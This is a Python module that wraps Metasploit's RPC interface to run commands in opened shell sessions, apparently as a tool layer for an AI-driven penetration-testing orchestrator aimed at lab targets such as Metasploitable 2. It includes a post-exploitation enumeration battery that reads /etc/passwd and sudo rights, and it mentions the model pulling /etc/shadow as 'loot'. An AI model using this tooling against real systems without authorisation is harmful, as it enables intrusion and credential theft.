import os
import threading
import time

from pymetasploit3.msfrpc import MsfRpcClient, ShellSession

import config

_SENTINEL = "---CMD_DONE---"

# Grace added on top of the caller's timeout for the hard wall-clock bound below.
_HANG_GRACE = 10

# How long to wait for a freshly opened shell to start round-tripping commands.
_WARMUP_TIMEOUT = 25

# How long a call waits to acquire the session lock before declaring the session
# busy. Normal calls are sequential so the lock is free; this only bites when a
# prior call wedged and still owns the stream (see _bounded_locked).
_LOCK_WAIT = 2

# Serializes all shell I/O. Two concurrent readers on one ShellSession steal each
# other's bytes, so the sentinel is never seen and every command times out. The
# orchestrator calls sequentially, but a timed-out call leaves an abandoned worker
# still reading; this lock stops the next call from piling a second reader on top.
_session_lock = threading.Lock()


def _split_token_echo(token: str) -> str:
    """An echo command whose typed form does NOT contain `token` literally.

    The shell echoes the command line back before its output, so scanning the
    stream for a bare token would match the command echo, not the executed
    result. Splitting the token with an empty-quote pair (echo AB''CD -> ABCD)
    keeps the literal token out of the typed line so only real output matches.
    """
    mid = max(1, len(token) // 2)
    return f"echo {token[:mid]}''{token[mid:]}"


def _connect() -> MsfRpcClient:
    return MsfRpcClient(
        config.MSF_PASS,
        server=config.MSF_HOST,
        port=config.MSF_PORT,
        ssl=config.MSF_SSL,
    )


def list_sessions() -> dict:
    """Return all active sessions from msfrpcd."""
    try:
        client = _connect()
        sessions = client.sessions.list
        return {
            "status":   "ok",
            "count":    len(sessions),
            "sessions": sessions,
        }
    except Exception as e:
        return {"status": "error", "error": str(e)}


def _run_command_blocking(session_id: str | int, command: str, timeout: int) -> dict:
    """The actual session round trip. May block; callers bound it with a thread."""
    try:
        client = _connect()
        session = client.sessions.session(str(session_id))

        if not isinstance(session, ShellSession):
            return {
                "status": "error",
                "error":  f"session {session_id} is not a shell session (type: {type(session).__name__})",
            }

        output = session.run_with_output(
            f"{command}; echo '{_SENTINEL}'",
            end_strs=[_SENTINEL],
            timeout=timeout,
        )

        # Strip the sentinel and any trailing whitespace from the output.
        clean = output.replace(_SENTINEL, "").strip()

        return {
            "status":     "ok",
            "session_id": str(session_id),
            "command":    command,
            "output":     clean,
        }

    except Exception as e:
        return {"status": "error", "error": str(e)}


def _warm_up_blocking(session_id: str | int, timeout: int) -> dict:
    """Wait until a freshly opened shell actually executes a command.

    Drains any banner already buffered, then repeatedly writes a unique echo and
    waits for its OUTPUT to come back. Uses the split-token trick so a shell that
    echoes the typed command cannot produce a false match. Returns once the token
    round-trips, or with ready=False if the budget runs out.
    """
    try:
        client = _connect()
        session = client.sessions.session(str(session_id))
        if not isinstance(session, ShellSession):
            return {"status": "error", "ready": False,
                    "error": f"session {session_id} is not a shell session"}
        try:
            session.read()  # discard any banner already sitting in the buffer
        except Exception:
            pass

        deadline = time.time() + timeout
        while time.time() < deadline:
            token = "RDY" + os.urandom(4).hex()
            try:
                session.write(_split_token_echo(token) + "\n")
            except Exception as e:
                return {"status": "error", "ready": False, "error": str(e)}
            probe_deadline = time.time() + 3
            buf = ""
            while time.time() < probe_deadline:
                try:
                    chunk = session.read() or ""
                except Exception:
                    chunk = ""
                buf += chunk
                if token in buf:
                    return {"status": "ok", "ready": True, "session_id": str(session_id)}
                if not chunk:
                    time.sleep(0.2)
        return {"status": "error", "ready": False,
                "error": "shell did not become responsive in time"}
    except Exception as e:
        return {"status": "error", "ready": False, "error": str(e)}


def _bounded_locked(fn, *, timeout: int, busy_label: str,
                    session_id: str | int, command: str | None = None) -> dict:
    """Run fn() against the shell under the session lock with a hard wall-clock cap.

    Only one call may touch a ShellSession at a time. If a prior call wedged and
    still holds the lock, we report busy instead of starting a competing reader.
    If THIS call wedges (worker still alive after the join), we deliberately do
    NOT release the lock: the abandoned worker still owns the stream, so the
    session is parked for the rest of the run rather than corrupted by a new
    reader. The single-engagement design makes that an acceptable trade.
    """
    extra = {"session_id": str(session_id)}
    if command is not None:
        extra["command"] = command

    if not _session_lock.acquire(timeout=_LOCK_WAIT):
        return {"status": "error", "error": f"session {session_id} busy ({busy_label})", **extra}

    box: dict = {}

    def worker() -> None:
        box["result"] = fn()

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join(timeout + _HANG_GRACE)
    if t.is_alive():
        # Keep the lock held on purpose; see the docstring.
        return {
            "status": "error",
            "error":  f"session {session_id} timed out after {timeout + _HANG_GRACE}s (unresponsive)",
            **extra,
        }
    _session_lock.release()
    return box.get("result", {"status": "error", "error": "no result from session worker", **extra})


def warm_up(session_id: str | int, timeout: int = _WARMUP_TIMEOUT) -> dict:
    """Block until the shell round-trips a command, or report ready=False.

    Call once right after a session opens, before issuing real commands, so the
    first probe is not lost to a not-yet-ready shell.
    """
    return _bounded_locked(
        lambda: _warm_up_blocking(session_id, timeout),
        timeout=timeout, busy_label="warm-up contended", session_id=session_id,
    )


def run_command(session_id: str | int, command: str, timeout: int = 30) -> dict:
    """
    Run a shell command in an open session and return its output.
    Uses a sentinel echo so we know exactly when output has finished.

    Serialized and hard-bounded via _bounded_locked: pymetasploit3's own timeout
    is unreliable on a not-ready shell (it once hung a whole engagement), and
    concurrent readers corrupt the stream. The lock + wall-clock cap make a stuck
    or contended session fail cleanly instead of freezing or cascading.
    """
    return _bounded_locked(
        lambda: _run_command_blocking(session_id, command, timeout),
        timeout=timeout, busy_label="prior command still running",
        session_id=session_id, command=command,
    )


# Enumeration batteries, keyed by category. Each entry is (label, primary,
# fallback) -- the fallback covers hosts where the primary tool is missing
# (Metasploitable 2 has ifconfig/netstat, not ip/ss). This is demoted scaffolding:
# the model should normally pick its own commands; this is a quick fixed sweep.
# /etc/shadow is intentionally NOT here -- reading it stays an explicit model
# run_command choice (the orchestrator's loot floor captures it either way).
_ENUM_BATTERIES = {
    "system": [
        ("kernel (uname -a)",       "uname -a",       None),
        ("OS release (/etc/issue)", "cat /etc/issue", None),
        ("hostname",                "hostname",       None),
    ],
    "users": [
        ("users (/etc/passwd)", "cat /etc/passwd", None),
    ],
    "network": [
        ("interfaces",        "ip addr",       "ifconfig -a"),
        ("listening sockets", "netstat -tlnp", "ss -tlnp"),
    ],
    "processes": [
        ("processes (ps aux)", "ps aux", None),
    ],
    "privileges": [
        ("privileges (sudo -n -l)", "sudo -n -l", None),
    ],
}


def enumerate_session(session_id: str | int, category: str = "all") -> dict:
    """Run a fixed battery of enumeration commands and return combined output.

    Demoted scaffolding / a fallback floor: the model normally reasons about
    where loot hides and issues its own run_command calls. This just runs a
    convenient sweep when asked. Each command goes through run_command (which is
    serialized and hard-bounded), falling back to a secondary command when the
    primary yields nothing. An unknown category is a structured error; a bad or
    closed session surfaces as whatever run_command returns. Never raises.
    """
    category = (category or "all").strip().lower()
    if category == "all":
        steps = [s for cat in ("system", "users", "network", "processes", "privileges")
                 for s in _ENUM_BATTERIES[cat]]
    elif category in _ENUM_BATTERIES:
        steps = list(_ENUM_BATTERIES[category])
    else:
        return {
            "status": "error",
            "error":  f"unknown enumeration category: {category} -- allowed: {sorted(_ENUM_BATTERIES) + ['all']}",
        }

    sections = []
    for label, primary, fallback in steps:
        res = run_command(session_id, primary)
        out = (res.get("output") or "").strip()
        if not out and fallback:
            res = run_command(session_id, fallback)
            out = (res.get("output") or "").strip()
        sections.append(f"=== {label} ===\n{out}")

    return {
        "status":   "ok",
        "category": category,
        "output":   "\n\n".join(sections),
    }


def close_session(session_id: str | int) -> dict:
    """Stop an active session."""
    try:
        client = _connect()
        session = client.sessions.session(str(session_id))
        session.stop()
        return {"status": "ok", "session_id": str(session_id), "closed": True}
    except Exception as e:
        return {"status": "error", "error": str(e)}
